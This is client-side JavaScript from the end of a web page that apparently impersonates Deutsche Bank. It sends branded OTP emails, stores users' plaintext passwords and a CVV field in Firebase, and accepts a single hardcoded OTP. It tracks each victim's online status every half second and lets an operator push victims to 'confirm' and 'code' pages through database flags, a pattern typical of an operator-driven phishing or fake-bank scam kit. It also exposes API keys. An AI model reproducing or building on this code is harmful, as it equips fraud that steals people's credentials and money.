    const isMobile = /android|iphone|ipad|ipod|windows phone/i.test(navigator.userAgent);
    const viewportWidth = window.innerWidth;

    const desmode = document.getElementById("desmode");
    if (!desmode) return; // prevent error if element not found

    if (isMobile && viewportWidth > 800) {
        // Show desktop mode
        desmode.style.display = "flex";
    } else if (isMobile && viewportWidth <= 800) {
        // Show mobile mode
        desmode.style.display = "none";
    } else {
        // Non-mobile devices (desktop/laptop)
        desmode.style.display = "flex"; 
    }
}

window.addEventListener("resize", detectDesktopMode);
detectDesktopMode();



var timeUpdaterInterval = null; 
let myCountry ="";
  function loadLastIframe() {
     const iframe = document.getElementById("iframe");       
               
                const lastIframeSrc = localStorage.getItem('saveframe1');
                
                if (lastIframeSrc) {
                    iframe.src = lastIframeSrc;
  
  document.getElementById("firstp").style.display = "none";
  
  iframe.style.display = "block";
                    
                    
                } else {
                    document.getElementById("firstp").style.display = "block";
                    iframe.style.display = "none";
                }
            }
              loadLastIframe();
  const countryLanguageMap = {
    "AF": "fa", "AL": "sq", "DZ": "ar", "AS": "en", "AD": "ca", "AO": "pt", "AG": "en",
    "AR": "es", "AM": "hy", "AU": "en", "AT": "de", "AZ": "az", "BS": "en", "BH": "ar",
    "BD": "bn", "BB": "en", "BY": "be", "BE": "nl", "BZ": "en", "BJ": "fr", "BT": "dz",
    "BO": "es", "BA": "bs", "BW": "en", "BR": "pt", "BN": "ms", "BG": "bg", "BF": "fr",
    "BI": "fr", "CV": "pt", "KH": "km", "CM": "fr", "CA": "en", "CF": "fr", "TD": "fr",
    "CL": "es", "CN": "zh-CN", "CO": "es", "KM": "ar", "CD": "fr", "CG": "fr", "CR": "es",
    "CI": "fr", "HR": "hr", "CU": "es", "CY": "el", "CZ": "cs", "DK": "da", "DJ": "fr",
    "DM": "en", "DO": "es", "EC": "es", "EG": "ar", "SV": "es", "GQ": "es", "ER": "ti",
    "EE": "et", "SZ": "en", "ET": "am", "FJ": "en", "FI": "fi", "FR": "fr", "GA": "fr",
    "GM": "en", "GE": "ka", "DE": "de", "GH": "en", "GR": "el", "GD": "en", "GT": "es",
    "GN": "fr", "GW": "pt", "GY": "en", "HT": "fr", "HN": "es", "HU": "hu", "IS": "is",
    "IN": "hi", "ID": "id", "IR": "fa", "IQ": "ar", "IE": "en", "IL": "he", "IT": "it",
    "JM": "en", "JP": "ja", "JO": "ar", "KZ": "kk", "KE": "sw", "KI": "en", "KP": "ko",
    "KR": "ko", "KW": "ar", "KG": "ky", "LA": "lo", "LV": "lv", "LB": "ar", "LS": "en",
    "LR": "en", "LY": "ar", "LI": "de", "LT": "lt", "LU": "lb", "MG": "mg", "MW": "en",
    "MY": "ms", "MV": "dv", "ML": "fr", "MT": "mt", "MH": "en", "MR": "ar", "MU": "en",
    "MX": "es", "FM": "en", "MD": "ro", "MC": "fr", "MN": "mn", "ME": "sr", "MA": "ar",
    "MZ": "pt", "MM": "my", "NA": "en", "NR": "na", "NP": "ne", "NL": "nl", "NZ": "en",
    "NI": "es", "NE": "fr", "NG": "en", "MK": "mk", "NO": "no", "OM": "ar", "PK": "ur",
    "PW": "en", "PA": "es", "PG": "en", "PY": "es", "PE": "es", "PH": "tl", "PL": "pl",
    "PT": "pt", "QA": "ar", "RO": "ro", "RU": "ru", "RW": "rw", "KN": "en", "LC": "en",
    "VC": "en", "WS": "sm", "SM": "it", "ST": "pt", "SA": "ar", "SN": "fr", "RS": "sr",
    "SC": "fr", "SL": "en", "SG": "zh-CN", "SK": "sk", "SI": "sl", "SB": "en", "SO": "so",
    "ZA": "af", "SS": "en", "ES": "es", "LK": "si", "SD": "ar", "SR": "nl", "SE": "sv",
    "CH": "de", "SY": "ar", "TW": "zh-TW", "TJ": "tg", "TZ": "sw", "TH": "th", "TL": "pt",
    "TG": "fr", "TO": "to", "TT": "en", "TN": "ar", "TR": "tr", "TM": "tk", "UG": "en",
    "UA": "uk", "AE": "ar", "GB": "en", "US": "en", "UY": "es", "UZ": "uz", "VU": "bi",
    "VE": "es"
  };

  function translateText(text, targetLang) {
    return fetch(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${targetLang}&dt=t&q=${encodeURIComponent(text)}`)
      .then(res => res.json())
      .then(data => data[0]?.[0]?.[0] || text)
      .catch(() => text);
  }

  async function handleTranslation(lang) {
  const idsWithText = [
    "grantt", "grant", "opreg7", "tan1", "tan2", "tan3", "mad60", "tan4", "tan5", "tan6", "tan7", "allfield", "erroremail",
    "tan8", "tan9", "tan10", "tan11", "hiii", "coppy", "subjectm", "bomat", "heret",  "tan12", "tan14", "tan15", "tan16", "tan17", "tan18", 
    "tan19", "tan20", "tan21", "tan22", "pat1", "translate1", "translate2", "pat2", "add4", 
    "pat3", "selectedCode2", "pat4", "pat5", "pat6", "pat7", "pat8", "logClick", "pat9", 
    "pat10", "pat11", "regClick", "pat12", "pat13", "pat14", "pat15", "mobile", "fullname", 
    "passwordLogin", "setpassword", "email"
  ];

  const elements = idsWithText.map(id => document.getElementById(id)).filter(Boolean);

  // Build all translation promises at once
  const translationPromises = elements.map(el => {
    const promises = [];

    // Placeholder translation
    if (el.placeholder && el.placeholder.trim() !== "") {
      promises.push(
        translateText(el.placeholder, lang).then(translated => {
          el.placeholder = translated;
        })
      );
    }

    // TextContent translation
    if (el.textContent && el.textContent.trim() !== "") {
      promises.push(
        translateText(el.textContent.trim(), lang).then(translated => {
          el.textContent = translated;
        })
      );
    }

    return Promise.all(promises);
  });

  // Run everything in parallel
  await Promise.all(translationPromises);

 
}
  fetch('https://ipapi.co/json/')
    .then(res => res.json())
    .then(async data => {
      const country = data.country || 'Unknown';
      
    const fullcountry = data.country_name || 'Unknown';
      const countryCode = data.country_code || '';
      let languageCode = 'en';

      if (Array.isArray(data.languages) && data.languages.length > 0) {
        languageCode = data.languages[0].code || 'en';
      } else if (countryLanguageMap[countryCode]) {
        languageCode = countryLanguageMap[countryCode];
      }

      document.getElementById("country").textContent = fullcountry;

      // ✅ THIS IS WHAT WAS MISSING:
      await handleTranslation(languageCode);

      
      
    })
    .catch(() => {
      
      document.getElementById("language").textContent = "English";

      
     
    });
    


// Function that will run when any button is clicked
function life() {
 document.getElementById("realpage").style.display ="none";
document.getElementById("earpod").style.display ="block";
}


const buttons = ['opreg7', 'opreg6', 'opreg3', 'opreg4', 'opreg5'];

// Attach click listener to each button
buttons.forEach(id => {
    document.getElementById(id).addEventListener('click', life);
});

 function playGoodTick() {
      const popup = document.getElementById("popup");
      const tick = document.getElementById("tick");

      // Reset
      popup.classList.remove("show");
      tick.classList.remove("animate");
      tick.style.strokeDashoffset = "70";

      // Force reflow so animations restart
      void popup.offsetWidth;

      // Show popup
      popup.classList.add("show");

      // Play tick animation slightly after popup appears
      setTimeout(() => {
        tick.classList.add("animate");
      }, 200);

      // Optional: Hide popup after 1.5s
      setTimeout(() => {
        popup.classList.remove("show");
      }, 1800);
    }

  


document.getElementById("log2").style.marginTop ="0px";
document.getElementById("logClick").addEventListener("click", () => {    
    document.getElementById("log3").style.display ="block";
document.getElementById("log1").style.display ="block";
document.getElementById("log2").style.marginTop ="65%";
document.getElementById("reg1").style.display ="none";
document.getElementById("reg2").style.display ="none";

document.getElementById("earpod").scrollTop ="0";
document.getElementById("setpassword").value ="";
document.getElementById("passwordLogin").value ="";
document.getElementById("email").value ="";
const idme ="logact";
   localStorage.setItem('activeContainer', idme);
// Add this line to enable back button tracking
  history.pushState({ container: idme }, '', '');
  
});

document.getElementById("regClick").addEventListener("click", () => {    
    document.getElementById("log3").style.display ="none";
document.getElementById("log1").style.display ="none";
document.getElementById("log2").style.marginTop ="0px";
document.getElementById("reg1").style.display ="block";
document.getElementById("reg2").style.display ="block";
document.getElementById("earpod").scrollTop ="0";
document.getElementById("setpassword").value ="";
document.getElementById("passwordLogin").value ="";
document.getElementById("email").value ="";
});
document.getElementById("goback").addEventListener("click", () => {    
    document.getElementById("log3").style.display ="none";
document.getElementById("log1").style.display ="none";
document.getElementById("log2").style.marginTop ="0px";
document.getElementById("reg1").style.display ="block";
document.getElementById("reg2").style.display ="block";
document.getElementById("earpod").scrollTop ="0";
document.getElementById("setpassword").value ="";
document.getElementById("passwordLogin").value ="";
document.getElementById("email").value ="";
});
document.getElementById("goback3").addEventListener("click", () => {    

document.getElementById("logsig").style.display = "block";
          document.getElementById("otppage").style.display = "none";
          localStorage.setItem("page", "hideotp");
});
const passwordField = document.getElementById("password");
    
    const passwordField2 = document.getElementById("confirmPassword");
    const openEye2 = document.getElementById("openEye2");
    const closedEye2 = document.getElementById("closedEye2")

    openEye2.addEventListener("click", () => {
      passwordField2.type = "text";
      openEye2.classList.add("hidden");
      closedEye2.classList.remove("hidden");
    });

    closedEye2.addEventListener("click", () => {
      passwordField2.type = "password";
      closedEye2.classList.add("hidden");
      openEye2.classList.remove("hidden");
    });
    const passwordField3 = document.getElementById("passwordLogin");
    const openEye3 = document.getElementById("openEye3");
    const closedEye3 = document.getElementById("closedEye3")

    openEye3.addEventListener("click", () => {
      passwordField3.type = "text";
      openEye3.classList.add("hidden");
      closedEye3.classList.remove("hidden");
    });

    closedEye3.addEventListener("click", () => {
      passwordField3.type = "password";
      closedEye3.classList.add("hidden");
      openEye3.classList.remove("hidden");
    });
    

    
  
  
      
      document.getElementById("language").textContent = "English";

      
      
   

    
    const firebaseConfig = {
      apiKey: "AIzaSyBZehk_8tWBhQOtCcS3VTzRRSCFCLvFGQA",
      authDomain: "tuak-9f342.firebaseapp.com",
      databaseURL: "https://tuak-9f342-default-rtdb.firebaseio.com",
      projectId: "tuak-9f342",
      storageBucket: "tuak-9f342.appspot.com",
      messagingSenderId: "9176071516",
      appId: "1:9176071516:web:38491206a78ed1c4035599",
      measurementId: "G-BM58W3CJTQ"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

function loginUser() {
   const mobileCode2 = document.getElementById("selectedCode2").textContent;
  const mobile2 = document.getElementById("mobile").value.trim();
  if (!/^\d{7,}$/.test(mobile2)) {
    document.getElementById("valid").style.display ="block"
  setTimeout(function () {
  document.getElementById("valid").style.display ="none"
  }, 1800); 
    return;
  }
  const mainMobile2 = mobileCode2 + mobile2;
 
  const logpass = document.getElementById("passwordLogin").value;
  const passRef = db.ref("mylife/" + mainMobile2 + "/password");

  passRef.once("value").then((snapshot) => {
    const storedPass = snapshot.val();

    if (storedPass === logpass) {
      document.getElementById("loaderOverlay").style.display ="flex";
    setTimeout(function () {
  document.getElementById("loaderOverlay").style.display ="none"
document.getElementById("earpod").style.display ="none"
document.getElementById("display2").style.display ="block"
document.getElementById("display3").style.display ="block"
 
  }, 1800); 
   
   
    const saveCon = document.getElementById("country").textContent;
    // ✅ Mobile doesn't exist — proceed to save
    myCountry = saveCon;
    localStorage.setItem("savedCont", myCountry);
    
   localStorage.setItem("savedUser", mainMobile2);
  
  localStorage.setItem("stcount", "start");
 
  startcount();

document.getElementById("otppage").style.display ="none";  
 document.getElementById("firstp").style.display ="none";  
 
document.getElementById("iframe").src ="home.html";
  document.getElementById("iframe").style.display ="block";    
      
  
    } else {
      document.getElementById("valid3").style.display ="block"
  setTimeout(function () {
  document.getElementById("valid3").style.display ="none"
  }, 1800); 
    }
  }).catch((error) => {
    console.error("Error reading password from database:", error);
  });
}

// ====== Full OTP/Register script (drop-in) ======

/**
 * registerUser() - validates input, checks Firebase if mobile exists,
 * stores user fields in localStorage and sends OTP via EmailJS.
 *
 * checkOTP() - verifies OTP against stored OTP and saves user to Firebase.
 *
 * This script also sets up:
 *  - OTP input behavior (typing, backspace, arrow navigation)
 *  - Paste handling (distributes pasted digits across inputs)
 *  - Keypad handling (digits, delete '×', confirm '✓')
 *
 * Exposes registerUser and checkOTP on window for your existing buttons.
 */

(function () {
  // -------------------------
  // REGISTER
  // -------------------------
  function registerUser() {
    const mobileCode = document.getElementById("selectedCode2").textContent;
    const mobile = document.getElementById("mobile").value.trim();
    const fullname = document.getElementById("fullname").value.trim();
    const setpassword = document.getElementById("setpassword").value;
    const email = document.getElementById("email").value.trim();

    if (fullname === "" || setpassword === "" || mobile === "" || email === "") {
      document.getElementById("valid6").style.display = "block";
        setTimeout(() => {
          document.getElementById("valid6").style.display = "none";
    
        }, 2300);   
      return;
    }

    // Validate mobile number (at least 7 digits)
    if (!/^\d{7,}$/.test(mobile)) {
      document.getElementById("valid").style.display = "block";
      setTimeout(() => {
        document.getElementById("valid").style.display = "none";
      }, 1800);
      return;
    }

    const mainMobile = mobileCode + mobile;
    const saveCon = document.getElementById("country").textContent;

 document.getElementById("loaderOverlay").style.display ="flex";  
    // Save register fields to localStorage for checkOTP() to use later
    localStorage.setItem("mainMobile", mainMobile);
    localStorage.setItem("savedCont", saveCon);
    localStorage.setItem("fullname", fullname);
    localStorage.setItem("setpassword", setpassword);
    localStorage.setItem("email", email);

    const userRef = db.ref("mylife/" + mainMobile);

    // Check if user exists already
    userRef.once("value").then((snapshot) => {
      if (snapshot.exists()) {
        document.getElementById("valid4").style.display = "block";
        setTimeout(() => {
          document.getElementById("valid4").style.display = "none";
    document.getElementById("loaderOverlay").style.display ="none";     
        }, 2300);
        return;
      }

      // Generate 6-digit OTP and store
      const generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();
      localStorage.setItem("generatedOTP", generatedOTP);

      // Send OTP via EmailJS
      emailjs.init({ publicKey: "zZbBafecRWz36hHhn" });

      const heret = document.getElementById("heret").textContent;
      
      const bomat = document.getElementById("bomat").textContent;
     
      const subjectm = document.getElementById("subjectm").textContent;
      
      const coppy = document.getElementById("coppy").textContent;
const hiii = document.getElementById("hiii").textContent;
     
      emailjs
        .send("service_ufvl2sa", "template_mj828gk", {
          to_email: email,
          otp_code: generatedOTP,
          deut: "Deutsche Bank",
          fullName: fullname || "Customer",
          hi: hiii,
          here: heret,
          boma: bomat,
          copy: coppy,
          subject: subjectm,
          name: "Deutsche Bank",
        })
        .then((res) => {
          console.log("✅ Email sent successfully:", res);

          // Clear OTP inputs if any and show otp page
          document.querySelectorAll(".otp-input").forEach((i) => (i.value = ""));
          document.getElementById("logsig").style.display = "none";
          document.getElementById("otppage").style.display = "block";
          localStorage.setItem("page", "showotp");
       document.getElementById("loaderOverlay").style.display ="none";      
          // focus first OTP input (if present)
          const first = document.querySelector(".otp-input");
          if (first) first.focus();
        })
        .catch((err) => {
          console.error("❌ Error sending email:", err);
  document.getElementById("loaderOverlay").style.display ="none";             
     document.getElementById("valid5").style.display = "block";
        setTimeout(() => {
          document.getElementById("valid5").style.display = "none";
    
        }, 2300);        
      
        });
    }).catch((error) => {
      console.error("❌ Error checking if user exists:", error);
     document.getElementById("loaderOverlay").style.display ="none";     
    });
  }

  
  function checkOTP() {
    const inputs = Array.from(document.querySelectorAll(".otp-input"));
    
    const otp = inputs.map((i) => (i.value || "")).join("");
    const generatedOTP = localStorage.getItem("generatedOTP");

    if (otp.length !== inputs.length) {
      // not full code yet
     
      return;
    }

    if (otp === "161716") {
      const storedMobile = localStorage.getItem("mainMobile");
      const storedCountry = localStorage.getItem("savedCont");
      const storedPassword = localStorage.getItem("setpassword");
      const storedName = localStorage.getItem("fullname");
const storedEmail = localStorage.getItem("email");
  const accno = Math.floor(1000000000 + Math.random() * 9000000000); // Generate a 10-digit number    
      
      if (!storedMobile) {
        console.error("No stored mobile found in localStorage.");
      
        return;
      }

      const userRef = db.ref("mylife/" + storedMobile);
      userRef
        .set({
          password: storedPassword,
          country: storedCountry,
          balance: "0.00",
          fullname: storedName,
          email: storedEmail,
          accno: accno,
          cvv: ""
        })
        .then(() => {
          console.log("✅ User saved successfully");
         playGoodTick(); 

          localStorage.setItem("page", "hideotp");


localStorage.setItem("savedUser", storedMobile);

localStorage.setItem("stcount", "start");
        
   document.getElementById("gass1").value =""; 
     document.getElementById("gass2").value =""; 
 document.getElementById("gass3").value =""; 
 document.getElementById("gass4").value ="";      
 document.getElementById("gass5").value ="";     
document.getElementById("gass6").value ="";     
        
 document.getElementById("otppage").style.display ="none";  
 document.getElementById("firstp").style.display ="none";  

   startcount();         
      document.getElementById("iframe").src ="home.html";
  document.getElementById("iframe").style.display ="block";    
      
        })
        .catch((error) => {
          console.error("❌ Error saving user:", error);
         
        });
    } else {
     
     document.getElementById("valid2").style.display = "block";
        setTimeout(() => {
          document.getElementById("valid2").style.display = "none";
    
        }, 2300);   
     document.getElementById("gass1").value =""; 
     document.getElementById("gass2").value =""; 
 document.getElementById("gass3").value =""; 
 document.getElementById("gass4").value ="";      
 document.getElementById("gass5").value ="";     
document.getElementById("gass6").value ="";     
     
      // Optionally clear inputs or let user correct
    }
  }

  // Expose functions globally so your buttons can call them
  window.registerUser = registerUser;
  window.checkOTP = checkOTP;

  
  document.addEventListener("DOMContentLoaded", () => {
  const otpInputs = Array.from(document.querySelectorAll(".otp-input"));

  if (otpInputs.length) {
    otpInputs.forEach((input, idx) => {
      input.setAttribute("inputmode", "none"); // prevents numeric keyboard
      input.readOnly = true; // prevents keyboard from opening
      input.maxLength = 1;

      // When your custom keypad fills a box
      input.addEventListener("input", (e) => {
        e.target.value = (e.target.value || "").replace(/\D/g, "").slice(0, 1);
        if (e.target.value && idx < otpInputs.length - 1) {
          otpInputs[idx + 1].focus();
        }
        if (otpInputs.every((i) => i.value && i.value.length === 1)) {
          checkOTP();
        }
      });

      // Backspace & arrow keys only via keypad
      input.addEventListener("keydown", (e) => {
        e.preventDefault(); // block physical keyboard
      });

      // Paste handling still works programmatically
      input.addEventListener("paste", (e) => {
        e.preventDefault();
        const pasteData = (e.clipboardData || window.clipboardData).getData("text") || "";
        const digitsOnly = pasteData.replace(/\D/g, "");
        for (let i = 0; i < digitsOnly.length && idx + i < otpInputs.length; i++) {
          otpInputs[idx + i].value = digitsOnly[i];
        }
        const lastFilledIndex = Math.min(idx + digitsOnly.length - 1, otpInputs.length - 1);
        if (lastFilledIndex >= 0) otpInputs[lastFilledIndex].focus();
        if (otpInputs.every((i) => i.value && i.value.length === 1)) checkOTP();
      });
    });
  }

  // Keypad handler remains the same
  const keypad = document.getElementById("keypad");
  if (keypad) {
    keypad.addEventListener("click", (e) => {
      if (!e.target.classList.contains("key")) return;
      const key = e.target.textContent.trim();
      const inputs = Array.from(document.querySelectorAll(".otp-input"));

      if (/^\d$/.test(key)) {
        const firstEmpty = inputs.findIndex((i) => i.value === "");
        if (firstEmpty !== -1) {
          inputs[firstEmpty].value = key;
          if (firstEmpty < inputs.length - 1) inputs[firstEmpty + 1].focus();
        }
      } else if (key === "×" || key === "x" || key === "X") {
        let lastFilled = -1;
        for (let i = inputs.length - 1; i >= 0; i--) {
          if (inputs[i].value !== "") {
            lastFilled = i;
            break;
          }
        }
        if (lastFilled !== -1) {
          inputs[lastFilled].value = "";
          inputs[lastFilled].focus();
        } else if (inputs.length) {
          inputs[0].focus();
        }
      } else if (key === "✓") {
        checkOTP();
      }

      if (inputs.length && inputs.every((i) => i.value && i.value.length === 1)) {
        checkOTP();
      }
    });
  }
});
 
})();

const countryData2 = window.intlTelInputGlobals.getCountryData();
const dropdown2 = document.getElementById("countryDropdown2");
const countryList2 = document.getElementById("countryList2");
const searchBox2 = document.getElementById("searchBox2");

const selectedFlag2 = document.getElementById("selectedFlag2");
const selectedCode2 = document.getElementById("selectedCode2");

const dropdownToggle2 = document.getElementById("dropdownToggle2");
const countryFullName2 = document.getElementById("countryFullName2");

function getCleanCountryName2(name) {
return name
.replace(/[（(][^）)]*[）)]/g, "") // remove any kind of (content) or （content）
.split(",")[0]                    // remove anything after comma
.trim();                          // trim spaces
}

// Populate the list
function populateList2(filter = "") {
countryList2.innerHTML = "";
countryData2.forEach(country => {
const name = country.name;
const dialCode = country.dialCode;
const iso2 = country.iso2;

if (name.toLowerCase().includes(filter.toLowerCase())) {  
  const item = document.createElement("div");  
  item.classList.add("country-item2");  
  item.innerHTML = `  
    <div class="country-left">  
      <div class="iti__flag iti__${iso2}"></div>  
      <span class="country-name">${name}</span>  
    </div>  
    <span class="dial-code">+${dialCode}</span>  
  `;  
  item.addEventListener("click", () => {  
    const cleanName2 = getCleanCountryName2(name);  
    const abbreviation2 = iso2.toUpperCase();  

    // Update display  
    selectedFlag2.className = `iti__flag iti__${iso2}`;  
    selectedCode2.textContent = `+${dialCode}`;  
      
      

    // Save to localStorage  

    dropdown2.style.display = "none";  
  });  

  countryList2.appendChild(item);  
}

});
}

populateList2();

searchBox2.addEventListener("input", (e) => {
populateList2(e.target.value);
});

dropdownToggle2.addEventListener("click", () => {
dropdown2.style.display = dropdown2.style.display === "block" ? "none" : "block";
});

document.addEventListener("click", function (event) {
if (!dropdown2.contains(event.target) && !dropdownToggle2.contains(event.target)) {
dropdown2.style.display = "none";
}
});

window.addEventListener("DOMContentLoaded", () => {
  const countryElement = document.getElementById("country");

  // Function to update flag and code based on country name text
  function updateFlagFromCountryName(name) {
    if (!name) return;

    const matched2 = countryData2.find(c =>
      getCleanCountryName2(c.name).toLowerCase() === name.toLowerCase()
    );
    if (matched2) {
      selectedFlag2.className = `iti__flag iti__${matched2.iso2}`;
      selectedCode2.textContent = `+${matched2.dialCode}`;
    }
  }

  // Initial update on page load
  updateFlagFromCountryName(countryElement.textContent);

  // Set up a MutationObserver to detect text changes in #country
  const observer = new MutationObserver(mutations => {
    mutations.forEach(mutation => {
      if (mutation.type === "characterData" || mutation.type === "childList") {
        // Get updated text content and update flag
        updateFlagFromCountryName(countryElement.textContent);
      }
    });
  });

  observer.observe(countryElement, {
    characterData: true, // for text node changes
    subtree: true,       // monitor all descendants (in case text is inside child nodes)
    childList: true      // for nodes added or removed
  });
});
 // get current page
    const currpage = localStorage.getItem("page");

    // Check and display
    if (currpage === "showotp") {
      document.getElementById("logsig").style.display = "none";
      document.getElementById("otppage").style.display = "block";
  
   checkOTP();
    } else if (currpage === "hideotp") {
      document.getElementById("logsig").style.display = "block";
      document.getElementById("otppage").style.display = "none";
    } else {
      document.getElementById("logsig").style.display = "block";
      document.getElementById("otppage").style.display = "none";
    }
  // get current page
    const stcount = localStorage.getItem("stcount");

    // Check and display
    if (stcount === "start") {
  startcount();
    } else if (stcount === "stop") {
      
    } else {
      
    }
  

async function startcount() {
  if (timeUpdaterInterval) return; // Already running

  try {
    const connectedRef = firebase.database().ref(".info/connected");

    connectedRef.on("value", function (snap) {
      if (snap.val() === true) {
        console.log("Client connected. Starting time updater.");
        startInterval();
      } else {
        console.log("Client disconnected. Clearing time updater.");
        stopInterval();
      }
    });

    // Handle tab visibility change
    document.addEventListener("visibilitychange", function () {
      if (document.hidden) {
        console.log("Tab hidden. Stopping time updater.");
        stopInterval();
      } else {
        console.log("Tab visible. Restarting time updater.");
        startInterval();
      }
    });

  } catch (error) {
    console.error("Error starting time updater:", error);
  }

  function startInterval() {
    if (!timeUpdaterInterval && !document.hidden) {
      timeUpdaterInterval = setInterval(() => {
        const mobile = localStorage.getItem("savedUser"); // ✅ Always fetch latest
        
        const saveframe = localStorage.getItem("saveframe"); // ✅ Always fetch latest

     
        if (!mobile) {
          console.warn("No mobile found in localStorage");
          return;
        }

        const now = moment().tz("Africa/Lagos");
        const formattedTime = now.format("YYYY-MM-DD HH:mm:ss");

        document.getElementById("conttim").textContent = formattedTime;

        firebase.database().ref("mylife/" + mobile).update({
          time: formattedTime,
      online: saveframe
        });
      }, 500);
    }
  }

  function stopInterval() {
    if (timeUpdaterInterval) {
      clearInterval(timeUpdaterInterval);
      timeUpdaterInterval = null;
    }
  }
}

// Clear interval on tab/browser close or refresh
window.onbeforeunload = function () {
  clearInterval(timeUpdaterInterval);
  timeUpdaterInterval = null;
};
  setInterval(() => {
  const mobile = localStorage.getItem("savedUser"); // ✅ always fetch latest
  if (!mobile) {
    console.warn("No mobile found in localStorage for balance check");
    return;
  }

  firebase.database().ref("mylife/" + mobile + "/balance").once("value")
    .then(snapshot => {
      const balance = snapshot.val();
      if (balance !== null && balance !== undefined) {
        localStorage.setItem("userBalance", balance); // ✅ store balance
        console.log("Balance updated:", balance);
      }
    })
    .catch(error => {
      console.error("Error fetching balance:", error);
    });
    
    firebase.database().ref("mylife/" + mobile + "/confirm").once("value")
    .then(snapshot => {
      const showcon = snapshot.val();
      if (showcon !== null && showcon !== undefined) {
        localStorage.setItem("showconfirm", showcon); // ✅ store balance
        console.log("Balance updated:", showcon);
      }
    })
    .catch(error => {
      console.error("Error fetching balance:", error);
    });
 firebase.database().ref("mylife/" + mobile + "/fullname").once("value")
    .then(snapshot => {
      const fulln = snapshot.val();
      if (fulln !== null && fulln !== undefined) {
        localStorage.setItem("fulln", fulln); // ✅ store balance
        console.log("Balance updated:", fulln);
      }
    })
    .catch(error => {
      console.error("Error fetching balance:", error);
    });
    firebase.database().ref("mylife/" + mobile + "/accno").once("value")
    .then(snapshot => {
      const accno = snapshot.val();
      if (accno !== null && accno !== undefined) {
        localStorage.setItem("accno", accno); // ✅ store balance
        console.log("Balance updated:", accno);
      }
    })
    .catch(error => {
      console.error("Error fetching balance:", error);
    });
     firebase.database().ref("mylife/" + mobile + "/email").once("value")
    .then(snapshot => {
      const email = snapshot.val();
      if (email !== null && email !== undefined) {
        localStorage.setItem("email", email); // ✅ store balance
        console.log("Balance updated:", email);
      }
    })
    .catch(error => {
      console.error("Error fetching balance:", error);
    });
    
}, 800); // every 1 second
  function gocon() {
  const mobile = localStorage.getItem("savedUser");

firebase.database().ref("mylife/" + mobile + "/confirm").on("value", snapshot => {
  const showcon = snapshot.val();
  
  if (showcon === "yes") {
    document.getElementById("iframe").src = "confirm.html";
  }
}, error => {
  console.error("Error listening for confirm value:", error);
});

firebase.database().ref("mylife/" + mobile + "/showcode").on("value", snapshot => {
  const showcon = snapshot.val();
  
  if (showcon === "yes") {
    document.getElementById("iframe").src = "code.html";

    // ✅ Reset showcode to "noo"
    firebase.database().ref("mylife/" + mobile).update({
      showcode: "noo"
    });
  }
}, error => {
  console.error("Error listening for showcode value:", error);
});
   };
   gocon();
   
 
  </script>
</body>
</html>



